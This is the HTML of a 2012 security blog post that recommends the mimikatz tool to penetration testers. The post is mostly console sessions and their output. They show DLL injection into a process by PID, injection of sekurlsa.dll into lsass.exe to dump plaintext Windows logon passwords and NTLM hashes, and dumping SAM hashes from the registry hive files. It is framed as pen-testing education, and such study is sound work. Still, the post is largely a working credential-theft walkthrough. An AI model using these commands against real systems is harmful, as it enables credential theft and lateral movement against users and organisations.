<!DOCTYPE html>
<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" lang="en-us">
<head>
    <meta http-equiv="content-type" content="text/html; charset=utf-8">
    
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1">
    <title> An interesting tool for your SwissKnife. &middot; Marco Ramilli </title>
    
    <link rel="stylesheet" type="text/css" href="http://marcoramilli.com/css/uno.min.css" />
    <link rel="stylesheet" type="text/css" href="http://marcoramilli.com/css/lightGallery.css" />
    
    <link rel="apple-touch-icon-precomposed" sizes="144x144" href="http://marcoramilli.com/apple-touch-icon-144-precomposed.png">
    <link rel="shortcut icon" href="images/favicon.ico">
    
    <link href="" rel="alternate" type="application/rss+xml" title="Marco Ramilli" />
    
    <script src="http://marcoramilli.com/js/jquery.min.js"></script>
    <script src="http://marcoramilli.com/js/main.min.js">
    </script>
</head>

<body>
  <div id="scriptHeader">
    <span class="mobile btn-mobile-menu">
            <i class="fa fa-bars btn-mobile-menu__icon"></i>
            <i class="fa fa-times btn-mobile-close__icon hidden"> </i>
    </span>
    <header class="
        
            panel-cover panel-cover--collapsed
        "  style="background-image: url(/images/background-cover.jpg)" >
    <div class="panel-main">
        <div class="panel-main__inner panel-inverted">
            <div class="panel-main__content"> 
                <a href="http://marcoramilli.com/" title="link to homepage for Marco Ramilli"> <img src="http://marcoramilli.com/images/MR.jpg" width="80" alt="Marco Ramilli logo" class="panel-cover__logo logo" /> </a> 
                <h1 class="panel-cover__title panel-title">
                    <a href="http://marcoramilli.com/"  title="link to homepage for Marco Ramilli">Marco Ramilli</a>
                </h1>
                <hr class="panel-cover__divider" />
                <p class="panel-cover__description">  cat /dev/random | grep cybersecurity  </p>
                  <hr class="panel-cover__divider panel-cover__divider--secondary" />


                    <div class="navigation-wrapper">
                        <nav class="cover-navigation cover-navigation--primary">
                              <li class="navigation__item"><a href="http://marcoramilli.com/#blog" title="link to Marco Ramilli blog"> <i  class='fa fa-th'></i></a> 
                                  <li class="navigation__item"><a href="http://marcoramilli.com/pages/about" title="About "> <i  class='fa fa-user'></i></a> 
                                  <li class="navigation__item"><a href="http://marcoramilli.com/pages/projects" title="Some of my Projects"> <i  class='fa fa-code-fork'></i></a>  
                                  <li class="navigation__item"><a href="http://marcoramilli.com/pages/publications" title="Selected Publications"> <i class='fa fa-book'> </i></a>  
                        </nav> 
                    </div>
                    <div class="navigation-wrapper">
                        <nav class="cover-navigation navigation--social">
    <ul class="navigation"> 
        
        <li class="navigation__item">
            <a href="http://twitter.com/Marco_Ramilli" title="@Marco_Ramilli on Twitter"> <i class='fa fa-twitter'></i> <span class="label">Twitter</span> </a>
        </li>   
        
        <li class="navigation__item">
            <a href="https://github.com/marcoramilli" title="marcoramilli on github"> <i class='fa fa-github'></i> <span class="label">Github</span> </a>
        </li>  </br>  
        
        <li class="navigation__item">
            <a href="https://www.linkedin.com/in/marcoramilli" title="Linkedin"> <i class='fa fa-linkedin'></i> <span class="label">Linkedin</span> </a>
        </li>  
        
        <li class="navigation__item">
            <a href="mailto:mramilli@gmail.com" title="Email mramilli@gmail.com"> <i class='fa fa-envelope-o'></i> <span class="label">Email</span> </a>
        </li>  </ul>
</nav>
 </div>


            </div>
        </div>
        <div class="panel-cover--overlay"></div>
    </div>
</header>
</div>
<noscript>
    <style>
        #scriptHeader {display:none;}
        .navigation-wrapper{
            display: block;
            top: 0;
        }
    </style>

    <header class="panel-cover panel-cover--collapsed" style="background-image: url(/images/background-cover.jpg)">
        <div class="panel-main">
            <div class="panel-main__inner panel-inverted">
                <div class="panel-main__content"> 
                    <a href="http://marcoramilli.com/" title="link to homepage for Marco Ramilli"> <img src="http://marcoramilli.com/images/MR.jpg" width="80" alt="Marco Ramilli logo" class="panel-cover__logo logo" /> </a> 
                    <h1 class="panel-cover__title panel-title">
                        <a href="http://marcoramilli.com/"  title="link to homepage for Marco Ramilli">Marco Ramilli</a>
                    </h1>
                    <hr class="panel-cover__divider" />
                    <p class="panel-cover__description">  cat /dev/random | grep cybersecurity  </p>
                    <hr class="panel-cover__divider panel-cover__divider--secondary" />
                    <div class="navigation-wrapper">
                        <nav class="cover-navigation cover-navigation--primary">
                            <ul class="navigation">
                              <li class="navigation__item"><a href="http://marcoramilli.com/#blog" title="link to Marco Ramilli blog"> <i  class='fa fa-th'></i></a> </li></br>
                                  <li class="navigation__item"><a href="http://marcoramilli.com/pages/about" title="About "> <i  class='fa fa-user'></i></a> </li></br> 
                                  <li class="navigation__item"><a href="http://marcoramilli.com/pages/projects" title="Some of my Projects"> <i  class='fafa-code-fork'></i></a> </li></br> 
                                  <li class="navigation__item"><a href="http://marcoramilli.com/pages/publications" title="Selected Publications"> <i class='fa fa-book'> </i></a>  
                           </ul>
                        </nav> <nav class="cover-navigation navigation--social">
    <ul class="navigation"> 
        
        <li class="navigation__item">
            <a href="http://twitter.com/Marco_Ramilli" title="@Marco_Ramilli on Twitter"> <i class='fa fa-twitter'></i> <span class="label">Twitter</span> </a>
        </li>   
        
        <li class="navigation__item">
            <a href="https://github.com/marcoramilli" title="marcoramilli on github"> <i class='fa fa-github'></i> <span class="label">Github</span> </a>
        </li>  </br>  
        
        <li class="navigation__item">
            <a href="https://www.linkedin.com/in/marcoramilli" title="Linkedin"> <i class='fa fa-linkedin'></i> <span class="label">Linkedin</span> </a>
        </li>  
        
        <li class="navigation__item">
            <a href="mailto:mramilli@gmail.com" title="Email mramilli@gmail.com"> <i class='fa fa-envelope-o'></i> <span class="label">Email</span> </a>
        </li>  </ul>
</nav>
 </div>
                </div>
            </div>
            <div class="panel-cover--overlay"></div>
        </div>
    </header>
</noscript>

  <div class="content-wrapper">
    <div class="content-wrapper__inner">
      <div class="post">
        <div class="post-meta">
          <span class="post-meta__date date">Feb 29, 2012</span>
          
          <span class="post-meta__tags tags">
            <font class="tags">
              
            </font>
          </span>
          • 600 words 3 min. read
        </div>
        <h1>An interesting tool for your SwissKnife.</h1>
        <section id="post-content" class="article-content post">
          <div dir="ltr" style="text-align: left;" trbidi="on"><div style="text-align: justify;">Hi folks,&nbsp;</div><div style="text-align: justify;">my past weeks have been quite intensive and busy, unfortunately next weeks seem to follow the same pattern... I am going to travel between conferences and meetings since early April, this could have some influence in my posting frequency. Said that, today I'd like to share a pretty nice tool pointed me out from a student of mine called <a href="http://blog.gentilkiwi.com/mimikatz">mimikatz</a>&nbsp;. This windows specific tool helps penetration testers in different ways, specifically it helps pen testers in finding clear text passwords of users logged on windows users and injecting libraries into processes. The author seems to be a french guy who posted examples and test-cases in french language. I am not a native french speaker so I am not going to describe every mimikatz feature (since I could merely understand the one I am going to describe), but rather I am going to describe the ones I believe to be more interesting for pen testers.&nbsp;</div><div style="text-align: justify;"><br /></div><div style="text-align: justify;">mimikatz::inject. This is the inject functionality implemented in mimikats framework. The inject parameter takes the PID and the library to inject as input parameters. The following example is injecting the kelloworld.dll into the process having PID 3256 which happens to be Microsoft Word processor.<br /><br /><i>mimikatz # inject::pid 3256 kelloworld.dll&nbsp;</i><br /><i>Attente de connexion du client...&nbsp;</i><br /><i>Serveur connecté à un client !</i><br /><i>Message du processus :&nbsp;</i><br /><i>Bienvenue dans un processus distant                         Gentil Kiwi&nbsp;</i><br /><i><br /></i><br /><i>mimikatz # @ping&nbsp;</i><br /><i>pong&nbsp;</i><br /><i><br /></i><br /><i>&nbsp;mimikatz # @helloworld </i><br /><br /><div class="separator" style="clear: both; text-align: center;"><a href="http://1.bp.blogspot.com/-6dsTcTuBs_Y/T04MK58DwfI/AAAAAAAAK7M/NwVeoW1hQ40/s1600/Screen+Shot+2012-02-29+at+12.27.27+PM.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" height="235" src="http://1.bp.blogspot.com/-6dsTcTuBs_Y/T04MK58DwfI/AAAAAAAAK7M/NwVeoW1hQ40/s320/Screen+Shot+2012-02-29+at+12.27.27+PM.png" width="320" /></a></div><div class="separator" style="clear: both; text-align: center;"><br /></div><div class="separator" style="clear: both; text-align: justify;">The following example shows hot to use sekurlsa.dll to get windows logon plain text passwords:</div><div class="separator" style="clear: both; text-align: justify;"><br /></div><div class="separator" style="clear: both; text-align: justify;"><i>mimikatz 1.0 x86 (pre-alpha)    /* Traitement du Kiwi */&nbsp;</i></div><div class="separator" style="clear: both; text-align: justify;"><i>mimikatz # privilege::debug&nbsp;</i></div><div class="separator" style="clear: both; text-align: justify;"><i>Demande d'ACTIVATION du privilège : SeDebugPrivilege : OK&nbsp;</i></div><div class="separator" style="clear: both; text-align: justify;"><i><br /></i></div><div class="separator" style="clear: both; text-align: justify;"><i>mimikatz # inject::process lsass.exe sekurlsa.dll&nbsp;</i></div><div class="separator" style="clear: both; text-align: justify;"><i>PROCESSENTRY32(lsass.exe).th32ProcessID = 488&nbsp;</i></div><div class="separator" style="clear: both; text-align: justify;"><i>Attente de connexion du client...&nbsp;</i></div><div class="separator" style="clear: both; text-align: justify;"><i>Serveur connecté à un client !&nbsp;</i></div><div class="separator" style="clear: both; text-align: justify;"><i>Message du processus :&nbsp;</i></div><div class="separator" style="clear: both; text-align: justify;"><i>Bienvenue dans un processus distant                         Gentil Kiwi&nbsp;</i></div><div class="separator" style="clear: both; text-align: justify;"><i><br /></i></div><div class="separator" style="clear: both; text-align: justify;"><i>SekurLSA : librairie de manipulation des données de sécurités dans LSASS&nbsp;</i></div><div class="separator" style="clear: both; text-align: justify;"><i><br /></i></div><div class="separator" style="clear: both; text-align: justify;"><i>mimikatz # @getLogonPasswords&nbsp;</i></div><div class="separator" style="clear: both; text-align: justify;"><i><br /></i></div><div class="separator" style="clear: both; text-align: justify;"><i>Authentification Id         : 0;434898&nbsp;</i></div><div class="separator" style="clear: both; text-align: justify;"><i>Package d'authentification  : NTLM&nbsp;</i></div><div class="separator" style="clear: both; text-align: justify;"><i>Utilisateur principal       : Gentil User&nbsp;</i></div><div class="separator" style="clear: both; text-align: justify;"><i>Domaine d'authentification  : vm-w7-ult&nbsp;</i></div><div class="separator" style="clear: both; text-align: justify;"><i>msv1_0 :        lm{ e52cac67419a9a224a3b108f3fa6cb6d }, ntlm{ 8846f7eaee8fb117ad06bdd830b7586c }</i></div><div class="separator" style="clear: both; text-align: justify;"><i>wdigest :       password&nbsp;</i></div><div class="separator" style="clear: both; text-align: justify;"><i>tspkg :         password&nbsp;</i></div><div class="separator" style="clear: both; text-align: justify;"><i><br /></i></div><div class="separator" style="clear: both; text-align: justify;"><i>Authentification Id         : 0;269806&nbsp;</i></div><div class="separator" style="clear: both; text-align: justify;"><i>Package d'authentification  : NTLM&nbsp;</i></div><div class="separator" style="clear: both; text-align: justify;"><i>Utilisateur principal       : Gentil Kiwi&nbsp;</i></div><div class="separator" style="clear: both; text-align: justify;"><i>Domaine d'authentification  : vm-w7-ult&nbsp;</i></div><div class="separator" style="clear: both; text-align: justify;"><i>msv1_0 :        lm{ d0e9aee149655a6075e4540af1f22d3b }, ntlm{ cc36cf7a8514893efccd332446158b1a }         wdigest :       waza1234/&nbsp;</i></div><div class="separator" style="clear: both; text-align: justify;"><i>&nbsp;tspkg :         waza1234/</i></div><br />This actually makes me reflecting on windows memory management. Since there is no the need of having plaintext passwords in LSASS, indeed it uses hashes and not plain text passwords, it means that the plain text passwords are stuck on the memory in the original input holding variable. This makes me thinking that no memory cleaners are used in windows logon. I am not sure 100%, I could be wrong but if you follows my brainstorming it could be easily this way, which actually is a quite important mistake which allows programs to read logon passwords from memory (as actually is working in this way! ).<br /><br />The following example shows how to use the hashes functionality to dump SAM hashes:<br /><br /><i>mimikatz # samdump::hashes z:\windows\system32\config\system z:\windows\system32\config\sam</i><br /><i><br /></i><br /><i>Ordinateur : VM-W2K8R2-ENT-X&nbsp;</i><br /><i>BootKey    : c4ed5743f54e4f1fdc6cca89723335ce&nbsp;</i><br /><i><br /></i><br /><i>Rid  : 500&nbsp;</i><br /><i>User : Administrateur&nbsp;</i><br /><i>LM   :&nbsp;</i><br /><i>NTLM : cc36cf7a8514893efccd332446158b1a&nbsp;</i><br /><i>Rid  : 501&nbsp;</i><br /><i>User : Invité&nbsp;</i><br /><i>LM   :&nbsp;</i><br /><i>NTLM :</i></div><div style="text-align: justify;"><br />You will find this interesting tool <a href="tp://blog.gentilkiwi.com/mimikatz">here</a>&nbsp;(it happens to be a french site, but google translator does its job very well). Finally I like and I do suggest to have in your own swiss-knife this interesting tool specially if you need to inject your own DLL into specific PID getting PID's rights. Have a nice hunting !<br /><br /></div><div style="text-align: justify;"><br /></div></div>

        </section>
      </div>
      <div class="sharing">
<a href="https://twitter.com/intent/tweet?status=An%20interesting%20tool%20for%20your%20SwissKnife.-http%3a%2f%2fmarcoramilli.com%2fpost%2fan-interesting-tool-for-your-swissknife.%2f" target="_blank" title="Follow me on Twitter" class="twitter">
<span class="fa fa-twitter-square fa-3x"></span></a>
<a href="https://www.facebook.com/sharer/sharer.php?u=http%3a%2f%2fmarcoramilli.com%2fpost%2fan-interesting-tool-for-your-swissknife.%2f" target="_blank" title="Join me on Facebook" class="facebook">
<span class="fa fa-facebook-square fa-3x"></span></a>
<a href="https://plus.google.com/share?url=http%3a%2f%2fmarcoramilli.com%2fpost%2fan-interesting-tool-for-your-swissknife.%2f" target="_blank" title="Google+" class="googleplus">
<span class="fa fa-google-plus-square fa-3x"></span></a>
<a href="http://www.linkedin.com/shareArticle?mini=true&url=http%3a%2f%2fmarcoramilli.com%2fpost%2fan-interesting-tool-for-your-swissknife.%2f&title=An%20interesting%20tool%20for%20your%20SwissKnife." target="_blank" title="LinkedIn" class="linkedin">
<span class="fa fa-linkedin-square fa-3x"></span></a>
<a href="http://www.reddit.com/submit?url=http%3a%2f%2fmarcoramilli.com%2fpost%2fan-interesting-tool-for-your-swissknife.%2f" target="_blank" title="Reddit" class="reddit"><span class="fa fa-reddit-square fa-3x"></span></a>
<a href="http://www.stumbleupon.com/submit?url=http%3a%2f%2fmarcoramilli.com%2fpost%2fan-interesting-tool-for-your-swissknife.%2f" target="_blank" title="StumbleUpon" class="stumbleupon"><span class="fa fa-stumbleupon fa-3x">
</span></a>
</div>

      



      <footer class="footer"></footer>

    </div>
  </div>
</body>
<script type="text/javascript" src="http://marcoramilli.com/js/awesome-toc.min.js"></script>
<script type="text/javascript">
$.awesome_toc({        
      title: "Index",
          overlay: true,
              contentId: "post-content",
});
</script>


<script>
(function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
      (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
  m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
      })(window,document,'script','https://www.google-analytics.com/analytics.js','ga');

ga('create', 'UA-5633272-11', 'auto');
  ga('send', 'pageview');
</script>


</html>
